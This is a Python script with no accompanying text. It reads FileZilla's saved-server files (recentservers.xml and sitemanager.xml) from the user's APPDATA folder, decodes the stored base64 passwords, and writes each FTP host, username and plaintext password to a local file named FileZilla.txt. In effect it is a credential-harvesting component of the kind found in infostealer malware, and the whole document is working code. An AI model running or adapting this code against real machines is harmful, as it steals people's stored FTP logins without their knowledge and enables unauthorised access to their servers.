import os
import base64
import xml.etree.ElementTree as ET

folder_path = os.path.join(os.environ['APPDATA'], 'FileZilla')
xml_file_paths = [os.path.join(folder_path, 'recentservers.xml'), os.path.join(folder_path, 'sitemanager.xml')]
lines_to_write = []
host_count = 0

for xml_file_path in xml_file_paths:
    if not os.path.exists(xml_file_path):
        continue
    try:
        xml_tree = ET.parse(xml_file_path)
        xml_root = xml_tree.getroot()
        for xml_node in xml_root.findall(".//Server"):
            url = f"ftp://{xml_node.find('Host').text}:{xml_node.find('Port').text}/"
            username = xml_node.find('User').text
            password = base64.b64decode(xml_node.find('Pass').text).decode('utf-8')
            lines_to_write.append(f"Url: {url}\nUsername: {username}\nPassword: {password}\n\n")
            host_count += 1
    except Exception:
        pass

if lines_to_write:
    with open("FileZilla.txt", "w") as file:
        file.writelines(lines_to_write)
    print(f"Found {host_count} hosts.")